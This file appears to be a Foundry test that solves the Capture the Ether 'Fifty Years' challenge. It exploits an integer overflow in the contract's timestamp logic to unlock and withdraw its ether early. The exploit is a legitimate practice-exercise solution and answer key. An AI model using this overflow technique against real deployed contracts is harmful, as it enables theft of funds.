pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/capture-the-ether/FiftyYears.sol";

contract FiftyYearsTest is Test {
    FiftyYears instance;

    receive() external payable {}

    function setUp() public {
        instance = new FiftyYears{value: 1 ether}(address(this));
    }

    function test() public {
        assertFalse(instance.isComplete());

        instance.upsert(1, type(uint256).max);
        // 1 days = 60 * 60 * 24 = 86400
        instance.upsert(2, 1 days + 1);
        vm.warp(1 days + 1);
        instance.withdraw(2);

        assertTrue(instance.isComplete());
    }
}
